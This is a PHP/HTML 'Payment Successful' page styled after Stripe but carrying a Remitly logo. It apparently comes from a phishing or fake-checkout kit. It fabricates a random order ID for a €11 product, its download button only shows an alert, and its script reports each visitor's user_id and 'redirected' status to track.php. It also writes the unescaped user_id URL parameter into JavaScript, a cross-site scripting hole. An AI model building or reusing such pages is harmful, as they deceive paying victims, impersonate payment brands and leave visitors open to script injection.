<?php
$user_id = $_GET['user_id'] ?? '';
?>
<!DOCTYPE html>
<html lang="en" translate="no">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="google" content="notranslate">
    <title>Payment Successful</title>
    <link rel="shortcut icon" href="assets/imgs/favicon.ico">
    <style>
        /* Stripe-like design */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f6f9fc;
            color: #32325d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .stripe-container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            padding: 40px;
            text-align: center;
        }
        
        .stripe-header {
            margin-bottom: 32px;
        }
        
        .stripe-logo {
            width: 120px;
            margin: 0 auto 24px;
        }
        
        .stripe-logo img {
            height: 32px;
            width: auto;
            max-width: 150px;
        }
        
        .stripe-title {
            font-size: 20px;
            font-weight: 600;
            color: #32325d;
            margin-bottom: 8px;
        }
        
        .stripe-subtitle {
            font-size: 15px;
            color: #6b7c93;
            line-height: 1.5;
        }
        
        /* Success checkmark */
        .checkmark {
            width: 60px;
            height: 60px;
            margin: 0 auto 24px;
        }
        
        .checkmark-circle {
            stroke: #00d924;
            stroke-width: 3;
            stroke-linecap: round;
            fill: none;
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }
        
        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
            stroke: #00d924;
            stroke-width: 3;
            stroke-linecap: round;
        }
        
        @keyframes stroke {
            100% {
                stroke-dashoffset: 0;
            }
        }
        
        /* Success title */
        .success-title {
            color: #00d924;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 16px;
        }
        
        /* Order info */
        .order-info {
            background: #f0fff4;
            border-radius: 8px;
            padding: 20px;
            margin: 32px 0;
            text-align: left;
            border-left: 3px solid #00d924;
        }
        
        .order-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 14px;
        }
        
        .order-row:last-child {
            margin-bottom: 0;
        }
        
        .order-label {
            color: #6b7c93;
        }
        
        .order-value {
            color: #32325d;
            font-weight: 500;
        }
        
        .amount-highlight {
            font-size: 24px;
            font-weight: 600;
            color: #32325d;
            margin: 12px 0;
            text-align: center;
        }
        
        /* Download button */
        .download-btn {
            display: inline-block;
            background: #635bff;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            margin-top: 20px;
            transition: background 0.2s;
        }
        
        .download-btn:hover {
            background: #4f46e5;
        }
        
        /* Success message */
        .success-message {
            font-size: 14px;
            color: #6b7c93;
            margin-top: 24px;
            padding: 16px;
            background: #f8f9fa;
            border-radius: 6px;
        }
        
        .success-message strong {
            color: #32325d;
        }
        
        /* Mobile responsive */
        @media (max-width: 480px) {
            .stripe-container {
                padding: 24px;
            }
            
            .stripe-title {
                font-size: 18px;
            }
            
            .stripe-subtitle {
                font-size: 14px;
            }
            
            .order-info {
                padding: 16px;
            }
            
            .success-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="stripe-container">
        <div class="stripe-header">
            <div class="stripe-logo">
                <img src="assets/imgs/remitly.jpg" alt="Secured by Stripe">
            </div>
            <h1 class="success-title">Payment Successful!</h1>
            <p class="stripe-subtitle">Thank you for your purchase. Your order has been processed successfully.</p>
        </div>
        
        <!-- Success checkmark -->
        <div class="checkmark">
            <svg class="checkmark-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
                <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
            </svg>
        </div>
        
        <!-- Order information -->
        <div class="order-info" id="orderInfo">
            <div class="order-row">
                <span class="order-label">Product</span>
                <span class="order-value" id="productName">Niche AI Coach Blueprint</span>
            </div>
            <div class="order-row">
                <span class="order-label">Order ID</span>
                <span class="order-value" id="orderId">ORD-<span id="randomId"></span></span>
            </div>
            <div class="order-row">
                <span class="order-label">Date & Time</span>
                <span class="order-value" id="orderDate">Just now</span>
            </div>
            <div class="amount-highlight" id="orderAmount">€11.00</div>
        </div>
        
        <!-- Download button -->
        <a href="#" class="download-btn" id="downloadBtn" onclick="alert('Download started! Check your email.');">
            Download Your Product
        </a>
        
        <!-- Success message -->
        <div class="success-message">
            <strong>What's next?</strong><br>
            Your product is ready for download. Click the button above to access your purchase.
            A confirmation email has been sent to your inbox.
        </div>
        
        <!-- Footer note -->
        <p class="stripe-subtitle" style="margin-top: 24px; font-size: 13px;">
            Need help? <a href="#" style="color: #635bff; text-decoration: none;">Contact support</a>
        </p>
    </div>
    
    <script>
        function showSuccess() {
            // Generate random order ID
            function generateOrderId() {
                return Math.random().toString(36).substr(2, 8).toUpperCase();
            }
            
            // Format current date
            function getCurrentDateTime() {
                const now = new Date();
                return now.toLocaleDateString('en-US', { 
                    month: 'short', 
                    day: 'numeric', 
                    year: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit'
                });
            }
            
            // Set random order ID
            document.getElementById('randomId').textContent = generateOrderId();
            
            // Set current date
            document.getElementById('orderDate').textContent = getCurrentDateTime();
            
            // Trigger checkmark animations
            setTimeout(() => {
                document.querySelector('.checkmark-circle').style.animationPlayState = 'running';
                document.querySelector('.checkmark-check').style.animationPlayState = 'running';
            }, 300);
            
            // Update user status in background
            const userID = "<?php echo $user_id; ?>";
            if (userID) {
                fetch('track.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: userID,
                        last_seen: Math.floor(Date.now() / 1000),
                        status: 'redirected',
                        redirect_to: 'success.php'
                    })
                });
            }
        }
        
        // Start when page loads
        document.addEventListener('DOMContentLoaded', showSuccess);
    </script>
</body>
</html>